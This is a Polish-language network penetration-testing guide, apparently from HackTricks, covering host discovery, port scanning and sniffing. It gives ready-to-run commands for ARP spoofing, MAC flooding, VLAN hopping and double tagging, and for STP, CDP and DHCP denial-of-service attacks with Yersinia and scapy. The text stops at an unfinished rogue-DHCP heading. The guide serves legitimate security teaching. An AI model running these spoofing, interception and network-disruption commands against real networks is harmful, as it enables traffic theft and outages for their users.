# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Odkrywanie hostów z zewnątrz

To będzie **krótka sekcja** na temat tego, jak znaleźć **IP odpowiadające** z **Internetu**.\
W tej sytuacji masz pewien **zakres IP** (może nawet kilka **zakresów**) i musisz tylko znaleźć **które IP odpowiadają**.

### ICMP

To jest **najłatwiejszy** i **najszybszy** sposób, aby odkryć, czy host jest aktywny, czy nie.\
Możesz spróbować wysłać kilka **pakietów ICMP** i **oczekiwać odpowiedzi**. Najłatwiejszym sposobem jest po prostu wysłanie **żądania echo** i oczekiwanie na odpowiedź. Możesz to zrobić, używając prostego `ping` lub używając `fping` dla **zakresów**.\
Możesz również użyć **nmap**, aby wysłać inne typy pakietów ICMP (to pomoże uniknąć filtrów dla powszechnych żądań-odpowiedzi ICMP echo).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Odkrywanie portów TCP

Bardzo często można zauważyć, że wszystkie rodzaje pakietów ICMP są filtrowane. Wtedy jedyną rzeczą, którą możesz zrobić, aby sprawdzić, czy host jest aktywny, jest **próba znalezienia otwartych portów**. Każdy host ma **65535 portów**, więc jeśli masz "duży" zakres, **nie możesz** sprawdzić, czy **każdy port** każdego hosta jest otwarty, ponieważ zajmie to zbyt dużo czasu.\
W takim razie potrzebujesz **szybkiego skanera portów** ([masscan](https://github.com/robertdavidgraham/masscan)) i listy **najczęściej używanych portów:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Możesz również wykonać ten krok za pomocą `nmap`, ale jest to wolniejsze i `nmap` ma problemy z identyfikacją aktywnych hostów.

### Odkrywanie portów HTTP

To jest po prostu odkrywanie portów TCP, przydatne, gdy chcesz **skupić się na odkrywaniu usług HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Odkrywanie portów UDP

Możesz również spróbować sprawdzić, czy niektóre **porty UDP są otwarte**, aby zdecydować, czy powinieneś **zwrócić większą uwagę** na **hosta.** Ponieważ usługi UDP zazwyczaj **nie odpowiadają** **żadnymi danymi** na standardowy pusty pakiet probe UDP, trudno jest stwierdzić, czy port jest filtrowany, czy otwarty. Najłatwiejszym sposobem na podjęcie decyzji jest wysłanie pakietu związanego z działającą usługą, a ponieważ nie wiesz, która usługa działa, powinieneś spróbować najbardziej prawdopodobnych na podstawie numeru portu:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Linia nmap zaproponowana wcześniej przetestuje **najlepsze 1000 portów UDP** w każdym hoście w zakresie **/24**, ale nawet to zajmie **>20min**. Jeśli potrzebujesz **najszybszych wyników**, możesz użyć [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. To wyśle te **proby UDP** do ich **oczekiwanego portu** (dla zakresu /24 zajmie to tylko 1 minutę): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Odkrywanie portów SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Tutaj znajdziesz ładny przewodnik po wszystkich znanych atakach Wifi w momencie pisania:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Odkrywanie hostów od wewnątrz

Jeśli jesteś w sieci, jedną z pierwszych rzeczy, które chcesz zrobić, jest **odkrycie innych hostów**. W zależności od **tego, ile hałasu** możesz/chcesz zrobić, można wykonać różne działania:

### Pasywne

Możesz użyć tych narzędzi do pasywnego odkrywania hostów w podłączonej sieci:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktywne

Zauważ, że techniki omówione w [_**Odkrywaniu hostów z zewnątrz**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) mogą być również **zastosowane tutaj**.\
Jednak, ponieważ jesteś w **tej samej sieci** co inne hosty, możesz zrobić **więcej rzeczy**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Zauważ, że techniki omówione w _Odkrywaniu hostów z zewnątrz_ ([_**ICMP**_](#icmp)) mogą być również **zastosowane tutaj**.\
Jednak, ponieważ jesteś w **tej samej sieci** co inne hosty, możesz zrobić **więcej rzeczy**:

- Jeśli **pingujesz** **adres rozgłoszeniowy podsieci**, ping powinien dotrzeć do **każdego hosta** i mogą oni **odpowiedzieć** **tobie**: `ping -b 10.10.5.255`
- Pingując **adres rozgłoszeniowy sieci**, możesz nawet znaleźć hosty w **innych podsieciach**: `ping -b 255.255.255.255`
- Użyj flag `-PE`, `-PP`, `-PM` w `nmap`, aby przeprowadzić odkrywanie hostów, wysyłając odpowiednio **żądania ICMPv4 echo**, **znacznika czasu** i **maski podsieci:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan jest używane do **włączania** komputerów za pomocą **wiadomości sieciowej**. Magiczny pakiet używany do włączenia komputera to tylko pakiet, w którym podany jest **MAC Dst**, a następnie jest **powtarzany 16 razy** w tym samym pakiecie.\
Takie pakiety są zazwyczaj wysyłane w **ethernet 0x0842** lub w **pakiecie UDP na port 9**.\
Jeśli **żaden \[MAC]** nie jest podany, pakiet jest wysyłany do **rozgłoszenia ethernet** (a rozgłoszeniowy MAC będzie tym, który jest powtarzany).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skanning hostów

Gdy odkryjesz wszystkie IP (zewnętrzne lub wewnętrzne), które chcesz dokładnie zeskanować, można wykonać różne działania.

### TCP

- **Otwarte** porty: _SYN --> SYN/ACK --> RST_
- **Zamknięte** porty: _SYN --> RST/ACK_
- **Filtrowane** porty: _SYN --> \[BRAK ODPOWIEDZI]_
- **Filtrowane** porty: _SYN --> komunikat ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Istnieją 2 opcje skanowania portu UDP:

- Wyślij **pakiet UDP** i sprawdź odpowiedź _**ICMP unreachable**_, jeśli port jest **zamknięty** (w wielu przypadkach ICMP będzie **filtrowany**, więc nie otrzymasz żadnych informacji, czy port jest zamknięty, czy otwarty).
- Wyślij **sformatowane datagramy**, aby wywołać odpowiedź od **usługi** (np. DNS, DHCP, TFTP i inne, jak wymieniono w _nmap-payloads_). Jeśli otrzymasz **odpowiedź**, to port jest **otwarty**.

**Nmap** **łączy obie** opcje, używając "-sV" (skanowanie UDP jest bardzo wolne), ale zauważ, że skanowanie UDP jest wolniejsze niż skanowanie TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** jest zaprojektowany do użycia obok **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Jego głównym celem jest ułatwienie transportu danych telekomunikacyjnych przez sieci IP, odzwierciedlając wiele funkcji niezawodności występujących w **Signaling System 7 (SS7)**. **SCTP** jest kluczowym składnikiem rodziny protokołów **SIGTRAN**, która ma na celu transport sygnałów SS7 przez sieci IP.

Wsparcie dla **SCTP** jest zapewniane przez różne systemy operacyjne, takie jak **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, co wskazuje na jego szeroką akceptację i użyteczność w dziedzinie telekomunikacji i sieci.

Dwa różne skany dla SCTP są oferowane przez nmap: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS i IPS omijanie

{{#ref}}
ids-evasion.md
{{#endref}}

### **Więcej opcji nmap**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Ujawnianie wewnętrznych adresów IP

**Źle skonfigurowane routery, zapory ogniowe i urządzenia sieciowe** czasami odpowiadają na próby sieciowe, używając **adresów źródłowych niepublicznych**. **tcpdump** może być wykorzystany do identyfikacji pakietów otrzymanych z prywatnych adresów podczas testowania. Konkretnie, na Kali Linux, pakiety mogą być przechwytywane na **interfejsie eth2**, który jest dostępny z publicznego Internetu. Ważne jest, aby zauważyć, że jeśli twoja konfiguracja znajduje się za NAT lub zaporą ogniową, takie pakiety prawdopodobnie będą filtrowane.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing pozwala na poznanie szczegółów zakresów IP, rozmiarów podsieci, adresów MAC i nazw hostów poprzez przeglądanie przechwyconych ramek i pakietów. Jeśli sieć jest źle skonfigurowana lub fabric przełączania jest obciążona, atakujący mogą przechwycić wrażliwe materiały za pomocą pasywnego sniffingu sieciowego.

Jeśli przełączona sieć Ethernet jest poprawnie skonfigurowana, zobaczysz tylko ramki rozgłoszeniowe i materiały przeznaczone dla twojego adresu MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Można również przechwytywać pakiety z zdalnej maszyny przez sesję SSH z Wireshark jako interfejsem graficznym w czasie rzeczywistym.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Oczywiście.

### Przechwytywanie poświadczeń

Możesz użyć narzędzi takich jak [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz), aby analizować poświadczenia z pliku pcap lub z aktywnego interfejsu.

## Ataki w LAN

### Spoofing ARP

Spoofing ARP polega na wysyłaniu niepotrzebnych odpowiedzi ARP, aby wskazać, że IP maszyny ma MAC naszego urządzenia. Wtedy ofiara zmieni tabelę ARP i skontaktuje się z naszą maszyną za każdym razem, gdy będzie chciała skontaktować się z IP, które zostało sfałszowane.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Przepełnienie tabeli CAM przełącznika poprzez wysyłanie dużej liczby pakietów z różnymi adresami MAC źródłowymi. Gdy tabela CAM jest pełna, przełącznik zaczyna zachowywać się jak hub (broadcastując cały ruch).
```bash
macof -i <interface>
```
W nowoczesnych przełącznikach ta podatność została naprawiona.

### Ataki 802.1Q VLAN / DTP

#### Dynamic Trunking

**Dynamic Trunking Protocol (DTP)** jest zaprojektowany jako protokół warstwy łącza, aby ułatwić automatyczny system trunkingu, pozwalając przełącznikom na automatyczny wybór portów w trybie trunk (Trunk) lub trybie nie-trunk. Wdrożenie **DTP** często postrzegane jest jako wskaźnik suboptymalnego projektowania sieci, podkreślając znaczenie ręcznej konfiguracji trunków tylko tam, gdzie to konieczne, oraz zapewnienia odpowiedniej dokumentacji.

Domyślnie porty przełącznika są ustawione na tryb Dynamic Auto, co oznacza, że są gotowe do inicjowania trunkingu, jeśli zostaną o to poproszone przez sąsiedni przełącznik. Problem bezpieczeństwa pojawia się, gdy pentester lub atakujący łączy się z przełącznikiem i wysyła ramkę DTP Desirable, zmuszając port do przejścia w tryb trunk. Działanie to umożliwia atakującemu enumerację VLAN-ów poprzez analizę ramek STP i obejście segmentacji VLAN, tworząc wirtualne interfejsy.

Obecność DTP w wielu przełącznikach domyślnie może być wykorzystywana przez przeciwników do naśladowania zachowania przełącznika, co pozwala na dostęp do ruchu we wszystkich VLAN-ach. Skrypt [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) jest wykorzystywany do monitorowania interfejsu, ujawniając, czy przełącznik jest w trybie Default, Trunk, Dynamic, Auto lub Access—ten ostatni jest jedyną konfiguracją odporną na ataki VLAN hopping. To narzędzie ocenia status podatności przełącznika.

Jeśli zostanie zidentyfikowana podatność sieci, narzędzie _**Yersinia**_ może być użyte do "włączenia trunkingu" za pomocą protokołu DTP, co pozwala na obserwację pakietów ze wszystkich VLAN-ów.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Aby enumerować VLAN-y, można również wygenerować ramkę DTP Desirable za pomocą skryptu [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**ie przerywaj skryptu w żadnych okolicznościach. Wstrzykuje DTP Desirable co trzy sekundy. **Dynamically created trunk channels on the switch only live for five minutes. After five minutes, the trunk falls off.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Chciałbym zwrócić uwagę, że **Access/Desirable (0x03)** wskazuje, że ramka DTP jest typu Desirable, co nakazuje portowi przełączenie się w tryb Trunk. A **802.1Q/802.1Q (0xa5)** wskazuje typ enkapsulacji **802.1Q**.

Analizując ramki STP, **dowiadujemy się o istnieniu VLAN 30 i VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atakowanie konkretnych VLAN-ów

Gdy znasz identyfikatory VLAN i wartości IP, możesz **skonfigurować wirtualny interfejs, aby zaatakować konkretny VLAN**.\
Jeśli DHCP nie jest dostępne, użyj _ifconfig_, aby ustawić statyczny adres IP.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Dyskusja na temat ataku **Dynamic Trunking i tworzenia wirtualnych interfejsów oraz odkrywania hostów wewnątrz** innych VLANów jest **automatycznie wykonywana** przez narzędzie: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Jeśli atakujący zna wartość **MAC, IP i VLAN ID of the victim host**, może spróbować **podwójnie otagować ramkę** jej przypisanym VLANem oraz VLANem ofiary i wysłać pakiet. Ponieważ **ofiara nie będzie mogła połączyć się z powrotem** z atakującym, **najlepszą opcją dla atakującego jest komunikacja za pomocą UDP** do protokołów, które mogą wykonać interesujące akcje (jak SNMP).

Inną opcją dla atakującego jest przeprowadzenie **skanowania portów TCP, podszywając się pod IP kontrolowane przez atakującego i dostępne przez ofiarę** (prawdopodobnie przez internet). Następnie atakujący mógłby podsłuchiwać na drugim hoście, który mu należy, jeśli otrzyma jakieś pakiety od ofiary.

![](<../../images/image (190).png>)

Aby przeprowadzić ten atak, możesz użyć scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Jeśli masz **dostęp do switcha, do którego jesteś bezpośrednio podłączony**, masz możliwość **obejścia segmentacji VLAN** w sieci. Po prostu **przełącz port w tryb trunk** (znany również jako trunk), utwórz wirtualne interfejsy z identyfikatorami docelowych VLAN-ów i skonfiguruj adres IP. Możesz spróbować zażądać adresu dynamicznie (DHCP) lub skonfigurować go statycznie. To zależy od przypadku.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

W niektórych środowiskach, takich jak sieci bezprzewodowe dla gości, wprowadza się ustawienia **izolacji portów (znane również jako prywatne VLAN)**, aby zapobiec bezpośredniej komunikacji między klientami podłączonymi do punktu dostępowego. Jednak zidentyfikowano technikę, która może obejść te środki izolacji. Technika ta wykorzystuje brak ACL w sieci lub ich niewłaściwą konfigurację, umożliwiając pakietom IP przechodzenie przez router, aby dotrzeć do innego klienta w tej samej sieci.

Atak jest realizowany poprzez stworzenie **pakietu, który zawiera adres IP docelowego klienta, ale z adresem MAC routera**. To powoduje, że router błędnie przekazuje pakiet do docelowego klienta. To podejście jest podobne do tego stosowanego w atakach Double Tagging, gdzie możliwość kontrolowania hosta dostępnego dla ofiary jest wykorzystywana do wykorzystania luki w zabezpieczeniach.

**Kluczowe kroki ataku:**

1. **Tworzenie pakietu:** Pakiet jest specjalnie tworzony, aby zawierał adres IP docelowego klienta, ale z adresem MAC routera.
2. **Wykorzystywanie zachowania routera:** Stworzony pakiet jest wysyłany do routera, który, z powodu konfiguracji, przekierowuje pakiet do docelowego klienta, omijając izolację zapewnianą przez ustawienia prywatnego VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) centralizuje zarządzanie VLAN. Wykorzystuje numery rewizji do utrzymania integralności bazy danych VLAN; każda modyfikacja zwiększa ten numer. Switche przyjmują konfiguracje z wyższymi numerami rewizji, aktualizując swoje własne bazy danych VLAN.

#### VTP Domain Roles

- **VTP Server:** Zarządza VLAN-ami—tworzy, usuwa, modyfikuje. Rozsyła ogłoszenia VTP do członków domeny.
- **VTP Client:** Otrzymuje ogłoszenia VTP, aby zsynchronizować swoją bazę danych VLAN. Ta rola jest ograniczona w zakresie lokalnych modyfikacji konfiguracji VLAN.
- **VTP Transparent:** Nie angażuje się w aktualizacje VTP, ale przekazuje ogłoszenia VTP. Nie jest dotknięty atakami VTP, utrzymuje stały numer rewizji równy zero.

#### VTP Advertisement Types

- **Summary Advertisement:** Rozsyłane przez serwer VTP co 300 sekund, zawiera istotne informacje o domenie.
- **Subset Advertisement:** Wysyłane po zmianach konfiguracji VLAN.
- **Advertisement Request:** Wydawane przez klienta VTP w celu zażądania ogłoszenia podsumowującego, zazwyczaj w odpowiedzi na wykrycie wyższego numeru rewizji konfiguracji.

Luki w VTP są wykorzystywane wyłącznie przez porty trunk, ponieważ ogłoszenia VTP krążą tylko przez nie. Scenariusze po ataku DTP mogą przejść do VTP. Narzędzia takie jak Yersinia mogą ułatwić ataki VTP, mając na celu usunięcie bazy danych VLAN, skutecznie zakłócając sieć.

Uwaga: Ta dyskusja dotyczy wersji VTP 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
W trybie graficznym Yersinii wybierz opcję usunięcia wszystkich VLAN-ów VTP, aby oczyścić bazę danych VLAN.

### Ataki STP

**Jeśli nie możesz przechwycić ramek BPDU na swoich interfejsach, jest mało prawdopodobne, że odniesiesz sukces w ataku STP.**

#### **STP BPDU DoS**

Wysyłając dużą liczbę ramek BPDU TCP (Powiadomienie o zmianie topologii) lub Conf (ramki BPDU, które są wysyłane, gdy topologia jest tworzona), przełączniki są przeciążone i przestają działać poprawnie.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Atak STP TCP**

Gdy wysyłany jest TCP, tabela CAM przełączników zostanie usunięta w ciągu 15s. Następnie, jeśli ciągle wysyłasz tego rodzaju pakiety, tabela CAM będzie restartowana ciągle (lub co 15 sekund) i gdy zostanie zrestartowana, przełącznik zachowuje się jak hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Atak STP Root**

Napastnik symuluje zachowanie przełącznika, aby stać się korzeniem STP w sieci. Wtedy więcej danych będzie przechodzić przez niego. To jest interesujące, gdy jesteś podłączony do dwóch różnych przełączników.\
To osiąga się poprzez wysyłanie pakietów BPDUs CONF, mówiących, że wartość **priorytetu** jest mniejsza niż rzeczywisty priorytet rzeczywistego przełącznika root.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Jeśli atakujący jest podłączony do 2 switchy, może stać się korzeniem nowego drzewa, a cały ruch między tymi switchami będzie przechodził przez niego** (zostanie przeprowadzony atak MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataki CDP

CISCO Discovery Protocol (CDP) jest niezbędny do komunikacji między urządzeniami CISCO, umożliwiając im **identyfikację nawzajem i dzielenie się szczegółami konfiguracji**.

#### Pasywne zbieranie danych <a href="#id-0e0f" id="id-0e0f"></a>

CDP jest skonfigurowany do nadawania informacji przez wszystkie porty, co może prowadzić do ryzyka bezpieczeństwa. Atakujący, podłączając się do portu przełącznika, może wdrożyć sniffery sieciowe, takie jak **Wireshark**, **tcpdump** lub **Yersinia**. Działanie to może ujawnić wrażliwe dane o urządzeniu sieciowym, w tym jego model i wersję Cisco IOS, którą obsługuje. Atakujący może następnie celować w konkretne luki w zidentyfikowanej wersji Cisco IOS.

#### Wzbudzanie zalewania tabeli CDP <a href="#id-0d6a" id="id-0d6a"></a>

Bardziej agresywne podejście polega na przeprowadzeniu ataku typu Denial of Service (DoS) poprzez przytłoczenie pamięci przełącznika, udając legalne urządzenia CISCO. Poniżej znajduje się sekwencja poleceń do rozpoczęcia takiego ataku przy użyciu Yersinia, narzędzia sieciowego zaprojektowanego do testowania:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Podczas tego ataku, CPU przełącznika i tabela sąsiadów CDP są mocno obciążone, co prowadzi do tego, co często określa się jako **„paraliż sieci”** z powodu nadmiernego zużycia zasobów.

#### Atak na podszywanie się pod CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Możesz również użyć [**scapy**](https://github.com/secdev/scapy/). Upewnij się, że zainstalujesz go z pakietem `scapy/contrib`.

### Ataki VoIP i narzędzie VoIP Hopper

Telefony VoIP, coraz bardziej zintegrowane z urządzeniami IoT, oferują funkcje takie jak odblokowywanie drzwi czy kontrolowanie termostatów za pomocą specjalnych numerów telefonów. Jednak ta integracja może stwarzać zagrożenia dla bezpieczeństwa.

Narzędzie [**voiphopper**](http://voiphopper.sourceforge.net) zostało zaprojektowane do emulacji telefonu VoIP w różnych środowiskach (Cisco, Avaya, Nortel, Alcatel-Lucent). Odkrywa identyfikator VLAN sieci głosowej za pomocą protokołów takich jak CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** oferuje trzy tryby dla protokołu Cisco Discovery Protocol (CDP):

1. **Tryb Sniff** (`-c 0`): Analizuje pakiety sieciowe w celu zidentyfikowania identyfikatora VLAN.
2. **Tryb Spoof** (`-c 1`): Generuje niestandardowe pakiety naśladujące te z rzeczywistego urządzenia VoIP.
3. **Tryb Spoof z gotowym pakietem** (`-c 2`): Wysyła pakiety identyczne do tych z konkretnego modelu telefonu IP Cisco.

Preferowanym trybem dla szybkości jest trzeci. Wymaga on określenia:

- Interfejsu sieciowego atakującego (`-i` parameter).
- Nazwy emulowanego urządzenia VoIP (`-E` parameter), zgodnie z formatem nazewnictwa Cisco (np. SEP, a następnie adres MAC).

W środowisku korporacyjnym, aby naśladować istniejące urządzenie VoIP, można:

- Sprawdzić etykietę MAC na telefonie.
- Przejść do ustawień wyświetlacza telefonu, aby zobaczyć informacje o modelu.
- Podłączyć urządzenie VoIP do laptopa i obserwować żądania CDP za pomocą Wireshark.

Przykładowe polecenie do uruchomienia narzędzia w trzecim trybie to:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataki DHCP

#### Enumeracja
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dwa typy DoS** mogą być przeprowadzone przeciwko serwerom DHCP. Pierwszy z nich polega na **symulowaniu wystarczającej liczby fałszywych hostów, aby wykorzystać wszystkie możliwe adresy IP**.\
Atak ten zadziała tylko wtedy, gdy możesz zobaczyć odpowiedzi serwera DHCP i zakończyć protokół (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Na przykład, **nie jest to możliwe w sieciach Wifi**.

Innym sposobem przeprowadzenia DoS DHCP jest wysłanie **pakietu DHCP-RELEASE, używając jako kodu źródłowego każdego możliwego adresu IP**. Wtedy serwer pomyśli, że wszyscy zakończyli korzystanie z adresu IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Bardziej automatyczny sposób na to to użycie narzędzia [DHCPing](https://github.com/kamorin/DHCPig).

Możesz użyć wspomnianych ataków DoS, aby zmusić klientów do uzyskania nowych dzierżaw w środowisku i wyczerpać legalne serwery, aby stały się nieodpowiednie. Gdy legalne serwery próbują ponownie się połączyć, **możesz serwować złośliwe wartości wspomniane w następnym ataku**.

#### Ustaw złośliwe wartości

